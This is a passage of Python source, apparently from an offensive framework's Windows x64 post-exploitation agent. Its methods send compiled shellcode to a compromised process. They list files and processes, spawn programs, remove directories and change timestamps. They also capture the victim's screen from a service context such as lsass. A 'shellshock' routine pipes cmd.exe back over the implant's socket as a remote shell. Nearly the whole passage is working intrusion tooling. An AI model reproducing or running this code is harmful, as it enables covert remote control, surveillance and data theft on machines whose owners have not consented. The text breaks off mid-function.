        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/sysinfo/base/getusernameex.asp
        returns the name of the current thread's user and domain
        """

        vars={'NameFormat': name_format}
        code="""
        #import "local", "secur32.dll|GetUserNameExA" as "GetUserNameExA"
        #import "local", "sendstring" as "sendstring"
        #import "local", "sendint" as "sendint"
        #import "int", "NameFormat" as "NameFormat"

        void main() {
          int ret;
          char outbuf[1000];
          int len;
          len=1000;
          ret=GetUserNameExA(NameFormat,outbuf,&len);
          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=self.readint()
        retbuffer=""
        if ret!=0:
            retbuffer=self.readstring()
        else:
            self.log("whoami failed?")
            retbuffer="Unknown!"
        self.leave()
        return retbuffer

    def GetTempPathA(self):
        """
	Gets the temporary file path.
	"""
        vars = {}
        self.clearfunctioncache()
        request = self.compile("""
        #import "local", "kernel32.dll|GetTempPathA" as "GetTempPathA"
        #import "local", "sendstring" as "sendstring"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"
        void
        main()
        {
            char tmp[512];
            int n;

            memset(tmp, 0, 512);
            n = GetTempPathA(512, tmp);
            sendint(n);
            if (n != 0)
            {
                sendstring(tmp);
            }
        }
        """)
        self.sendrequest(request)
        n = self.readint()
        tmp = ''
        if n:
            tmp = self.readstring()
        self.leave()
        return tmp

    def rmdir(self, filename):
        vars={}
        vars["filename"]=filename
        code="""
        //start of code
        #import "local", "kernel32.dll|RemoveDirectoryA" as "RemoveDirectoryA"
        #import "local","sendint" as "sendint"
        #import "string","filename" as "filename"

        void main()
        {
            int i;
            i=RemoveDirectoryA(filename);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        if not ret:
            return "%s was removed."%filename
        else:
            return "%s was not removed due to some kind of error."%filename

    # Listing the files in a directory:
    #  http://msdn.microsoft.com/library/default.asp?url=/library/en-us/fileio/base/listing_the_files_in_a_directory.asp
    def dodir(self, directory):
        self.log("Dodir: %s" % directory)

        if type(directory) != type(u""):
            #not unicode? Do cast.
            directory = directory.decode("utf-8")

        if directory[:-2] != u"\\*":
            #add trailer so it works (it doesn't automatically assume this in the API like you would expect)
            directory += u"\\*"

        vars={}
        #add null terminator
        vars["dir"]=directory.encode("utf-16-le")+"\x00\x00"
        self.log("Getting directory listing: %s"%directory)
        code="""
        #import "string","dir" as "dir"
        #import "local","sendunistring2self" as "sendunistring2self"
        #import "local","sendint" as "sendint"
        #import "local","memset" as "memset"
        #import "local", "kernel32.dll|FindFirstFileW" as "FindFirstFileW"
        #import "local", "kernel32.dll|FindNextFileW" as "FindNextFileW"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "kernel32.dll|FindClose" as "FindClose"

        struct FILETIME {
           int dwLowDateTime;
           int dwHighDateTime;
        };

        struct WIN32_FIND_DATA {
           int dwFileAttributes;
           struct FILETIME ftCreationTime;
           struct FILETIME ftLastAccessTime;
           struct FILETIME ftLastWriteTime;
           int nFileSizeHigh;
           int nFileSizeLow;
           int dwReserved0;
           int dwReserved1;
           char cFileName[512]; //should be MAX_PATH (using short here for tchar)
           char cAlternateFileName[28];
           char PAD[5000];
        };

        void sendFILETIME(struct FILETIME *ft) {
           // filetimes are basically two "longs" to us
           sendint(ft->dwLowDateTime);
           sendint(ft->dwHighDateTime);
        }

        void main() {
            struct WIN32_FIND_DATA FindFileData;
            long long hFind;
            int Error;

            //we just sort of run zeros into the padding here
            memset(&FindFileData, 0, 2000);

            hFind = -1;
            hFind = FindFirstFileW(dir, &FindFileData);
            // Hmm, I think this might not work since hFind is 64 bits!
            if(hFind == -1) {
               // We send a -1 to indicate there are no more files to send
               sendint(-1);
               Error=GetLastError();
               sendint(Error);
               return 0;
            } else {
               sendint(FindFileData.dwFileAttributes);
               sendint(FindFileData.nFileSizeLow);
               sendFILETIME(&FindFileData.ftLastWriteTime);
               sendunistring2self(FindFileData.cFileName);

            }

            //we just sort of run zeros into the padding here
            memset(&FindFileData, 0, 2000);

            while (FindNextFileW(hFind, &FindFileData) != 0)
            {
               sendint(FindFileData.dwFileAttributes);
               sendint(FindFileData.nFileSizeLow);
               sendFILETIME(&FindFileData.ftLastWriteTime);
               sendunistring2self(FindFileData.cFileName);
               //we just sort of run zeros into the padding here
               memset(&FindFileData, 0, 2000);

            }
            Error = GetLastError();
            sendint(-1);
            sendint(Error); // IF ERROR_NO_MORE_FILE everything works ok :>
            FindClose(hFind);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code, vars)
        self.sendrequest(request)
        countfile=0
        files=[]
        while 1:
            attr = sint32(self.readint())
            if attr == -1:
                break

            size= sint32(self.readint())
            ftCreationTime=self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
            filename = self.readblock()
            #filename is really utf-16-le encoded
            filename = filename.decode("utf-16-le")
            devlog("win64", "dodir: Filename: %s"%filename)
            files.append((attr, size,ftCreationTime, filename))
            countfile+=1

        error=sint32(self.readint())
        self.leave()
        devlog("win64", "Done getting directory listing of %s"%directory)
        if error == 18:
            return (countfile, files)
        else:
            return (-1, [error, directory])

    def CreateProcessA(self,command,inherithandles=0, dwCreationFlags=0x00000000):

        vars={}
        #cnt = command.rfind("\\")
        #if cnt != -1:
        #    lpAplicationName = command[cnt+1:]
        #else:
        #we pass in None which results in a NULL pointer, which makes CreateProcessA do the work for us
        #if you have a space in your string, you'll need to put quotes around it.
        vars["lpAplicationName"]=None
        vars["command"]=command
        vars["inherithandles"]=inherithandles
        vars["creationflags"] = dwCreationFlags

        logging.debug("CreateProcessA() -> lpAp: %s command: %s"%(vars["lpAplicationName"], command))
        code="""
        #import "local", "kernel32.dll|CreateProcessA" as "CreateProcessA"
        #import "local","kernel32.dll|GetStartupInfoA" as "GetStartupInfoA"
        #import "local", "memset" as "memset"

        #import "local","sendint" as "sendint"
        #import "string", "command" as "command"
        #import "string", "lpAplicationName" as "lpAplicationName"
        #import "int", "inherithandles" as "inherithandles"
        #import "int", "creationflags" as "creationflags"

        struct STARTUPINFO {
            int cb;
            //int alignment1;         // TODO: this shouldn't be necesary
            char* lpReserved;
            char* lpDesktop;
            char* lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            //int alignment2;        // TODO: this shouldn't be necesary
            int * lpReserved2;
            long long hStdInput;
            long long hStdOutput;
            long long hStdError;
        };

        void main() {
          struct STARTUPINFO si;
          int i;
          char pi[32];

          memset(pi,0,16);

          GetStartupInfoA(&si);
          si.dwFlags=0x0001; //STARTF_USESHOWWINDOW
          si.wShowWindow=1;

          // CreateProcess: http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/createprocess.asp
          i=CreateProcessA(lpAplicationName,command,0,0,inherithandles,creationflags,0,0,&si,pi);
          sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=sint32(self.readint())
        self.leave()

        logging.debug("CreateProcessA returned %d" % ret)

        return ret


    def dospawn(self,filename):

        #Using spawn() itself has a particular problem, which is that spawn() is actually a wrapper around
        #createprocessA that sets a few options for you - such as inherit handles. However, you
        #often want to set inherithandles to 0. Example: If you hack inetinfo.exe, and spawn calc.exe()
        #it will then have a handle to port 80, which means that when inetinfo.exe dies, you won't
        #be able to start a new one, since port 80 will be taken.
        #So we need to call CreateProcessA() manually here.
        logging.debug("SPAWNING: %s"%filename)
        # set DETACHED_PROCESS on spawn
        ret = self.CreateProcessA(filename,inherithandles=0, dwCreationFlags=0x00000008)
        if ret:
            return "%s was spawned."%(filename)
        else:
            return "%s was not spawned due to some kind of error (%d)."%(filename,ret)

    def screengrab(self, fileobj=None, progr=False):
        """
        captures a screen and sends it back
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/gdi/bitmaps_5a5h.asp
        http://www.codeproject.com/dialog/screencap.asp #better page
        You can actually do this three different ways
        1. GDI (most supported)
           GDI+ will allow you to convert between BMP and PNG/JPEG
        2. DirectX - will allow you to grab screenshots without the "black box" that
           games will generate to GDI. Requires D3D initialization.
        3. Windows Media (Requires COM fun)

        We're just trying for GDI here. Simple, effective, I hope.
        """

        vars={}
        '''
        vars["HORZRES"]=HORZRES #8
        vars["VERTRES"]=VERTRES #0xa
        vars["SRCCOPY"]=SRCCOPY #0xcc0020
        vars["CF_BITMAP"]=CF_BITMAP #2
        vars["DIB_RGB_COLORS"]=DIB_RGB_COLORS #0
        vars["BI_RGB"]=BI_RGB #0
        '''
        vars["HORZRES"]=0x8
        vars["VERTRES"]=0xa
        vars["SRCCOPY"]=0xcc0020
        vars["CF_BITMAP"]=0x2
        vars["DIB_RGB_COLORS"]=0
        vars["BI_RGB"]=0

        if progr:
            progr("Assembling screengrab shellcode", 10.0)
        code="""
        #import "local", "user32.dll|GetDesktopWindow" as "GetDesktopWindow"
        #import "local", "user32.dll|OpenWindowStationA" as "OpenWindowStationA"
        #import "local", "user32.dll|CloseWindowStation" as "CloseWindowStation"
        #import "local", "user32.dll|GetProcessWindowStation" as "GetProcessWindowStation"
        #import "local", "user32.dll|SetProcessWindowStation" as "SetProcessWindowStation"
        #import "local", "user32.dll|OpenInputDesktop" as "OpenInputDesktop"
        #import "local", "user32.dll|CloseDesktop" as "CloseDesktop"
        #import "local", "user32.dll|GetThreadDesktop" as "GetThreadDesktop"
        #import "local", "user32.dll|SetThreadDesktop" as "SetThreadDesktop"
        #import "local", "kernel32.dll|GetCurrentThreadId" as "GetCurrentThreadId"

        #import "local", "user32.dll|GetDC" as "GetDC"
        #import "local", "gdi32.dll|CreateDCA" as "CreateDCA"
        #import "local", "gdi32.dll|CreateCompatibleDC" as "CreateCompatibleDC"
        #import "local", "gdi32.dll|GetDeviceCaps" as "GetDeviceCaps"
        #import "local", "gdi32.dll|CreateCompatibleBitmap" as "CreateCompatibleBitmap"
        #import "local", "gdi32.dll|SelectObject" as "SelectObject"
        #import "local", "gdi32.dll|BitBlt" as "BitBlt"
        #import "local", "gdi32.dll|CreateDIBSection" as "CreateDIBSection"
        #import "local", "gdi32.dll|DeleteObject" as "DeleteObject"
        #import "local", "gdi32.dll|DeleteDC" as "DeleteDC"

        //uncomment for testing with the clipboard
        //#import "local", "user32.dll|OpenClipboard" as "OpenClipboard"
        //#import "local", "user32.dll|EmptyClipboard" as "EmptyClipboard"
        //#import "local", "user32.dll|SetClipboardData" as "SetClipboardData"
        //#import "local", "user32.dll|CloseClipboard" as "CloseClipboard"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "local","memset" as "memset"
        #import "local","senddata2self" as "senddata2self"

        #import "int","HORZRES" as "HORZRES"
        #import "int","VERTRES" as "VERTRES"
        #import "int","SRCCOPY" as "SRCCOPY"
        #import "int","CF_BITMAP" as "CF_BITMAP"
        #import "int","DIB_RGB_COLORS" as "DIB_RGB_COLORS"
        #import "int","BI_RGB" as "BI_RGB"

        #import "local","debug" as "debug"

        struct BITMAPINFOHEADER {
          int  biSize;
          int   biWidth;
          int   biHeight;
          short   biPlanes;
          short   biBitCount;
          int  biCompression;
          int  biSizeImage;
          int   biXPelsPerMeter;
          int    biYPelsPerMeter;
          int   biClrUsed;
          int   biClrImportant;
        };

        struct RGBQUAD {
          unsigned char     rgbBlue;
          unsigned char     rgbGreen;
          unsigned char     rgbRed;
          unsigned char     rgbReserved;
        };

        struct BITMAPINFO {
           struct BITMAPINFOHEADER bmiHeader;
           struct RGBQUAD          bmiColors[1]; //not sure what to do about that
        };


        void main() {
          int hwnd;
          int dc;
          int newdc;
          int hor;
          int vert;
          int hBmpFileDC;
          int hfilebitmap;
          int hbitmap;
          int size;
          int threadid;
          char **pBits;
          struct BITMAPINFOHEADER *pbih;
          struct BITMAPINFO bi;
          int newwinsta;
          int oldwinsta;
          int topdesk;
          int olddesktop;

          //debug();

          //If you use GetDC you should ReleaseDC
          //if you createDC, you should DeleteDC
          //Don't use this because lsass doesn't have a screen. Want to grab the display instead
          //hwnd=GetDesktopWindow();

          //the following crap is to make sure we get the interactive desktop if we are in lsass
          //or another service
          newwinsta=OpenWindowStationA("WinSta0",0,0xc0000000); //read|write
          oldwinsta=GetProcessWindowStation();
          SetProcessWindowStation(newwinsta);

          //now desktop fun
          topdesk=OpenInputDesktop(0,0,0x20000000); //maximum allowed
          olddesktop=GetThreadDesktop(GetCurrentThreadId());
          SetThreadDesktop(topdesk);

          dc=GetDC(0); //Gets the desktop context
          threadid=GetCurrentThreadId();
          newdc=CreateCompatibleDC(dc);
          hor=GetDeviceCaps(newdc,HORZRES);
          vert=GetDeviceCaps(newdc,VERTRES);
          hbitmap=CreateCompatibleBitmap(dc,hor,vert);
          SelectObject(newdc,hbitmap);
          BitBlt(newdc,0,0,hor,vert,dc,0,0,SRCCOPY);

          //This little section is for testing that it worked by C-Ving into paint
          //If using VMWARE, it'll be a little weird, cause only when the VM has
          //focus will the clipboard work, or the screengrab work, or something
          //OpenClipboard(hwnd);
          //EmptyClipboard();
          //SetClipboardData(CF_BITMAP,hbitmap);
          //CloseClipboard();

          size=3*hor*vert; //here's to hopin' :>

          pbih=&bi.bmiHeader;
          pbih->biSize=44; //sizeof(bi.bmiHeader)
          pbih->biHeight=vert;
          pbih->biWidth=hor;
          pbih->biPlanes=1;
          pbih->biBitCount=24;
          pbih->biCompression=BI_RGB;
          pbih->biSizeImage=size;


          hBmpFileDC=CreateCompatibleDC(newdc);
          hfilebitmap=CreateDIBSection(hBmpFileDC,&bi,DIB_RGB_COLORS,&pBits,0,0);
          SelectObject(hBmpFileDC,hfilebitmap);
          BitBlt(hBmpFileDC,0,0,hor,vert,newdc,0,0,SRCCOPY);


          sendint(hor);
          sendint(vert);
          senddata2self(pBits,size);

          //cleanup
          DeleteObject(hfilebitmap);
          DeleteObject(hbitmap);
          DeleteDC(hBmpFileDC);
          DeleteDC(dc);
          DeleteDC(newdc);
          SetThreadDesktop(olddesktop);
          CloseDesktop(topdesk);
          SetProcessWindowStation(oldwinsta);
          CloseWindowStation(newwinsta);

          //need to add closeobject here and deletedc, etc

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        #print "Grabbing screenshot in 1 second!"
        #time.sleep(1)
        if progr:
            progr("Sending screengrab shellcode", 30.0)
        self.sendrequest(request)
        hor=self.readint()
        vert=self.readint()
        if progr:
            progr("Reading coordinates of screen", 40.0)

        devlog("win32mosdef", "Hor=%d vert=%d"%(hor,vert))
        data=""
        if progr:
            progr("Retrieving data", 60.0)

        if not fileobj:
            #just read the data into the file
            data=self.readblock()
        else:
            data=self.readblock(fileobj=fileobj)

        if progr:
            progr("Closing link with end", 90.0)

        #print "BGR (RGB backwards) Data=%s"%hexprint(data[:100])
        self.leave()
        if progr:
            progr("Completed receiving screenshot", 100.0)

        return hor,vert,data


    def rootkit_present( self ):
        return -1


    def dostat(self, file):
        vars        = {}
        vars["dir"] = file

        code="""
        #import "string","dir" as "dir"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "local", "kernel32.dll|FindFirstFileA" as "FindFirstFileA"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        struct FILETIME {
           int dwLowDateTime;
           int dwHighDateTime;
        };

        struct WIN32_FIND_DATA {
           int dwFileAttributes;
           struct FILETIME ftCreationTime;
           struct FILETIME ftLastAccessTime;
           struct FILETIME ftLastWriteTime;
           int nFileSizeHigh;
           int nFileSizeLow;
           int dwReserved0;
           int dwReserved1;
           char cFileName[260];
           char cAlternateFileName[14];
        };
        void sendFILETIME(struct FILETIME *ft) {
           sendint(ft->dwLowDateTime);
           sendint(ft->dwHighDateTime);
        }
        void main() {
            struct WIN32_FIND_DATA FindFileData;
            long long hFind;
            int Error;

            hFind = -1;
            hFind = FindFirstFileA(dir, &FindFileData);
            if(hFind == -1) {
               // We send a -1 mean there is no more file to sent
               sendint(-1);
               Error=GetLastError();
               sendint(Error);
               return 0;
            } else {
               sendint(FindFileData.dwFileAttributes);
               sendint(FindFileData.nFileSizeLow);
               sendFILETIME(&FindFileData.ftLastWriteTime);
               sendstring(FindFileData.cFileName);
            }
        }

        """
        self.clearfunctioncache()
        request=self.compile(code, vars)
        self.sendrequest(request)
        countfile = 0
        files     = []

        attr = sint32(self.readint())
        if attr == -1:
            error          = sint32(self.readint())
            size           = error
            ftCreationTime = error
            file           = "error"
        else:
            size           = sint32(self.readint())
            ftCreationTime = self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
            file           = self.readstring()
            countfile     += 1

        self.leave()

        return (attr, size, ftCreationTime, file)

    def ExitThread(self,exitcode):
        """
        Calls exit thread with the exitcode
        """

        vars={}
        vars["exitcode"]=exitcode

        code="""
        //start of code
        #import "local","kernel32.dll|ExitThread" as "ExitThread"
        #import "int","exitcode" as "exitcode"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            i=ExitThread(exitcode);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=None
        ret=self.readint()
        self.leave()
        return ret


    def touch(self, filename, actime, modtime):
        vars={}
        code="""
        #import "local","msvcrt.dll|_utime64" as "_utime64"

        #import "local", "sendint" as "sendint"

        #import "string", "filename" as "filename"
        #import "long long", "actime" as "actime"
        #import "long long", "modtime" as "modtime"

        struct _utimbuf {
        long long actime;
        long long modtime;
        };

        void main()
        {
        struct _utimbuf utb;
        int ret;

        //set up structure
        utb.actime = actime;
        utb.modtime = modtime;

        ret = _utime64(filename, &utb);
        if (ret == 0) {
           sendint(1); //0 on success
        }
        else {
          sendint(0); //-1 on failure
        }
        }
        """
        vars["filename"] = filename + "\x00"
        vars["actime"] = actime
        vars["modtime"] = modtime
        logging.debug("touch: %s %d %d" % (filename, actime, modtime))
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()

        self.leave()
        return ret

    def processlist(self):
        return self.doprocesslisting()

    def doprocesslisting(self):
        """
        Returns a list of dictionaries of the processes
        """
        ret=[]

        vars={}
        code="""
        #import "local", "kernel32.dll|CreateToolhelp32Snapshot" as "CreateToolhelp32Snapshot"
        #import "local", "kernel32.dll|Process32First" as "Process32First"
        #import "local", "kernel32.dll|Process32Next" as "Process32Next"
        #import "local", "kernel32.dll|CloseHandle" as "CloseHandle"

        #import "local","sendint" as "sendint"
        #import "local","sendstring" as "sendstring"

        //#import "local","debug" as "debug"
        //http://www.cs.colorado.edu/~main/cs1300/include/tlhelp32.h for #defines?

        struct PROCESSENTRY32 {
          int dwSize;
          int cntUsage;
          int th32ProcessID;
          int * th32DefaultHeapID;
          int th32ModuleID;
          int cntThreads;
          int th32ParentProcessID;
          int pcPriClassBase;
          int dwFlags;
          char szExeFile[1024];
          };

        void main() {
          int ret;
          int hProcessSnap;
          struct PROCESSENTRY32 pe32;

          // Take a snapshot of all processes in the system.
          hProcessSnap = CreateToolhelp32Snapshot( 2, 0 ); //TH32CS_SNAPPROCESS (2) on all processes (0)
          if( hProcessSnap == -1 )
          {
            sendint(-1);
          }
          // Set the size of the structure before using it.
          pe32.dwSize = 1060; //sizeof( PROCESSENTRY32 ); // (sizeof is hard, sorry)
          ret=Process32First( hProcessSnap, &pe32 );
          if (ret==0) {
             sendint(-1);
             return;
          }
          //send first process
          sendint(1);
          sendstring(pe32.szExeFile);
          sendint(pe32.th32ProcessID );
          sendint(pe32.cntThreads );
          sendint(pe32.th32ParentProcessID );

          //send all remaining processes
          while( Process32Next( hProcessSnap, &pe32 ) )
          {
             sendint(1);
             sendstring(pe32.szExeFile);
             sendint(pe32.th32ProcessID );
             sendint(pe32.cntThreads );
             sendint(pe32.th32ParentProcessID );
          }
          //last process...
          sendint(-1);
          CloseHandle(hProcessSnap);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=[]
        success=1
        while success != -1:
            success=sint32(self.readint())
            if success == -1:
                break
            proc={}
            proc["exe"]=self.readstring()
            proc["pid"]=self.readint()
            proc["cntThreads"]=self.readint()
            proc["ppid"]=self.readint()
            ret.append(proc)
        self.leave()
        return ret


    # Work in progress
    def shellshock(self, logfile=None):
        """
        win64 cmd.exe shellshock, modified from dave's popen2
        """
        self.log("Shellshocking")

        vars={}
        cmdexe=self.getComSpec()
        self.log("ComSpec: %s"%cmdexe)
        vars["cmdexe"]=cmdexe

        (ret,hChildStdinRd,hChildStdinWr)=self.CreatePipe()
        if ret==0:
            return "Failed to create pipe!"
        (ret,hChildStdinWrDup)=self.DuplicateHandle(hChildStdinWr)
        if ret==0:
            return "Failed to duplicate handle for writing"
        (ret,hChildStdoutRd,hChildStdoutWr)=self.CreatePipe()
        if ret==0:
            return "Failed to create stdout pipe!"
        (ret,hChildStdoutRdDup)=self.DuplicateHandle(hChildStdoutRd)
        if ret==0:
            return "Failed to duplicate handle for reading"

        self.CloseHandle(hChildStdoutRd)
        self.CloseHandle(hChildStdinWr)

        command="cmd.exe"

        self.clearfunctioncache()
        vars={}
        vars["command"]=command
        vars["cmdexe"]=cmdexe
        vars["stdin"]=hChildStdinRd
        vars["stdout"]=hChildStdoutWr
        vars["mosdefd"]=self.fd
        vars["readfd"]=hChildStdoutRdDup
        vars["writefd"]=hChildStdinWrDup

        code="""
        #import "local","kernel32.dll|GetStartupInfoA" as "GetStartupInfoA"
        #import "local","kernel32.dll|CreateProcessA" as "CreateProcessA"
        #import "local", "kernel32.dll|ReadFile" as "ReadFile"
        #import "local", "kernel32.dll|WriteFile" as "WriteFile"
        #import "local", "kernel32.dll|PeekNamedPipe" as "PeekNamedPipe"
        #import "local", "ws2_32.dll|select" as "select"
        #import "local", "ws2_32.dll|recv" as "recv"
        #import "local", "kernel32.dll|CloseHandle" as "CloseHandle"
        //#import "local", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "memset" as "memset"
        #import "local", "writeblock" as "writeblock"
        #import "local", "sendint" as "sendint"
        #import "string","cmdexe" as "cmdexe"
        #import "string","command" as "command"
        #import "long long", "stdin" as "stdin"
        #import "long long", "stdout" as "stdout"
        #import "long long", "mosdefd" as "mosdefd"
        #import "long long", "readfd" as "readfd"
        #import "long long", "writefd" as "writefd"

        //#import "local", "debug" as "debug"


        struct STARTUPINFO {
            int cb;
            char* lpReserved;
            char* lpDesktop;
            char* lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            int * lpReserved2;
            long long hStdInput;
            long long hStdOutput;
            long long hStdError;
        };


        struct timeval {
                int tv_sec;
                int tv_usec; };

        struct  fd_set_t {
                   int fd_count;
                   long long fd;
        };

        void main() {
          struct timeval tv;
          struct STARTUPINFO si;
          struct fd_set_t fd_set;
          int inherithandles;
          int i;
          int n;
          int noread;
          int numread;
          int numwritten;
          char in[512];
          char out[512];
          char pi[32];

          //changed 16 to 32
          memset(pi,0,32);

          inherithandles = 1;
          GetStartupInfoA(&si);
          si.dwFlags = 0x0101; //STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
          si.wShowWindow = 0;
          si.hStdInput = stdin;
          si.hStdOutput = stdout;
          si.hStdError = stdout;

          i = CreateProcessA(cmdexe,command,0,0,inherithandles,0,0,0,&si,pi);
          sendint(i);

          // close stdoutwr and stdinrd
          CloseHandle(stdout);
          CloseHandle(stdin);

          // main io loop (bit of a kludge, but it'll do for now)
          while(1)
          {

            fd_set.fd_count = 1; // actual n
            fd_set.fd = mosdefd;
            n = 2; // ignored
            tv.tv_sec = 0;
            tv.tv_usec = 10;
            // very small timeout
            i = select(n, &fd_set, 0, 0, &tv);
            if (i != 0)
            {
              memset(&in, 0, 512);
              i = recv(mosdefd, in, 511, 0);
              //dump to filehandle
              WriteFile(writefd, in, i, &numwritten, 0);
            }

            i = 1;
            // dump response from cmd.exe back to remote
            while (i != 0)
            {
              noread=0;
              n = PeekNamedPipe(readfd, 0, 0, &numread, &numwritten, 0);

              if(n == 0)
              {
                // process is gone, prolly exited :P
                // WriteFile + sockets d't go together
                writeblock(mosdefd, &n, 4);
                // be shellshock_loop non-xor compatible
                return;
              }

              if(numread == 0)
              {
                noread = 1;
                i = 0;
              }
              numread = 0;
              if (noread == 0)
              {
                memset(&out, 0, 512);
                i = ReadFile(readfd, out, 511, &numread, 0);
              }
              // i want && support !
              if(i != 0)
              {
                if (numread != 0)
                {
                  writeblock(mosdefd, &numread, 4); // be shellshock_loop non-xor compatible
                  writeblock(mosdefd, out, numread);
                }
              }
            }
          }
        }

        """

        #if you need to send some debug information
        #expect that no ;-)
        debugblock = '''
            g = GetLastError();
            h = 4;
            writeblock(mosdefd, &h, 4);
            writeblock(mosdefd, &g, 4);
        '''

        # sendint and readint use xorkey!!!
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        # createprocess result
        ret =  self.readint()
        if ret == 0:
            self.log("Couldn't create process, returning...")
            self.CloseHandle(hChildStdoutRdDup)
            self.CloseHandle(hChildStdinWrDup)
            return

        # shellshock loop
        ret = self.shellshock_loop(endian="little", logfile=logfile)

        self.leave()

        self.CloseHandle(hChildStdoutRdDup)
        self.CloseHandle(hChildStdinWrDup)
        self.log("Shellshock finished")
        return


    ###########
    #Socket calls
    def close(self,fd):
        vars={}
        vars["fdtoclose"]=fd

        code="""
        #import "local","ws2_32.dll|closesocket" as "closesocket"
        #import "long long","fdtoclose" as "fdtoclose"
        #import "local","sendint" as "sendint"

        void main()
        {
            int i;
            i=closesocket(fdtoclose);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def setblocking(self, fd, blocking):
        code = """
        #import "int", "blocking" as "blocking"
        #import "int", "FIONBIO" as "FIONBIO"
        #import "long long", "sock" as "sock"
        #import "local", "ws2_32.dll|ioctlsocket" as "ioctlsocket"

        void main() {
            int NonBlock;
            NonBlock = blocking;

            // Blocking   = 0
            // Noblocking = 1
            ioctlsocket(sock, FIONBIO, &NonBlock);
        }
        """
        vars = {}

        if blocking:
            blocking = 0
        else:
            blocking = 1

        vars["blocking"] = blocking
        vars["sock"]     = fd
        vars["FIONBIO"]  = 0x8004667eL

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()
        return

    def setsockopt(self, fd, option, arg):
        code = """
        #import "local", "ws2_32.dll|setsockopt" as "setsockopt"
        #import "int","arg" as "arg"
        #import "int","option" as "option"
        #import "int","level" as "level"
        #import "long long", "sock" as "sock"

        void main() {
          int arg2;
          arg2 = arg;
          setsockopt(sock, level, option, &arg2, 4);
        }
        """
        vars={}
        vars["option"] = option
        vars["arg"]    = arg
        vars["sock"]   = fd
        vars["level"]  = 0xffff #SOL_SOCKET
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()
        return

    def getrecvcode(self,fd,length):
        devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))
        code="""
        #import "local", "ws2_32.dll|recv" as "recv"
        #import "local", "ws2_32.dll|WSAGetLastError" as "WSAGetLastError"
        #import "local", "writeblock2self" as "writeblock2self"

        #import "int", "length" as "length"
        #import "long long", "fd" as "fd"

        void main()
        {
            int i;
            int err;
            char buf[1000];
            int wanted;
            int ret;
            int fault;

            wanted = length;
            while (wanted > 0 ) {
                if (wanted < 1000) {
                    i = recv(fd, buf, wanted, 0);
                }
                else {
                    i = recv(fd, buf, 1000, 0);
                }

                if (i == 0xffffffff)
                {
                    // if our socket is Nonblocking, we might fall into this situtation
                    err = WSAGetLastError();

                    // WSAEWOULDBLOCK
                    if (err != 0x2733) {
                        fault = 1;
                    }

                    // WSAEINTR
                    if (err != 0x2714) {
                        fault = fault + 1;
                    }

                    // some kind of error that is not WSAEWOULDBLOCK/WSAEINTR
                    if (fault == 2) {
                        ret = writeblock2self(buf, 0);
                        wanted = 0;
                    }
                }
                else {
                    ret = writeblock2self(buf, i);
                    wanted = wanted - i;
                }
            }
        }
        """

        vars            = {}
        vars["fd"]      = fd
        vars["length"]  = int(length)
        self.clearfunctioncache()
        message = self.compile(code, vars)

        return message

    def recv(self, fd, length):
        """
        reliable recv from socket
        """
        message = self.getrecvcode(fd, length)
        self.sendrequest(message)
        self.leave()
        #reliable recv
        buffer = self.node.parentnode.recv(self.connection, length)
        devlog("shellserver::recv", "got %d: %s" % (len(buffer), prettyprint(buffer)))

        return buffer

    def recv_lazy(self, fd, timeout=None, length=1000):
        """
        Get whatever is there.
        Return "" on nothing there, and exception socket.error on fail
        """

        if timeout == None:
            timeout = 0 # immediately return
        if length > 1000:
            length = 1000
        devlog("win64","In recv_lazy fd=%d timeout=%d length=%d" % (fd, timeout, length))
#        return self.recv(fd,length)

        code = """
        #import "local", "ws2_32.dll|select" as "select"
        #import "local", "ws2_32.dll|recv" as "recv"
        #import "local", "senddata2self" as "senddata2self"
        #import "local", "sendint" as "sendint"
        #import "long long", "fd" as "fd"
        #import "int", "timeout" as "timeout"
        #import "int", "length" as "length"
        #import "local", "debug" as "debug"

        struct  fd_set {
            int fd_count;
            long long fd;
        };
        struct timeval {
            int tv_sec;
            int tv_usec;
        };

        void main()
        {
            int i;
            char buf[1000];
            int r;
            struct fd_set readfd;
            struct fd_set errorfd;
            struct timeval tv;

            readfd.fd_count = 1;
            readfd.fd = fd; // fd
            errorfd.fd_count=1;
            errorfd.fd = fd; // fd

            tv.tv_usec= 0;
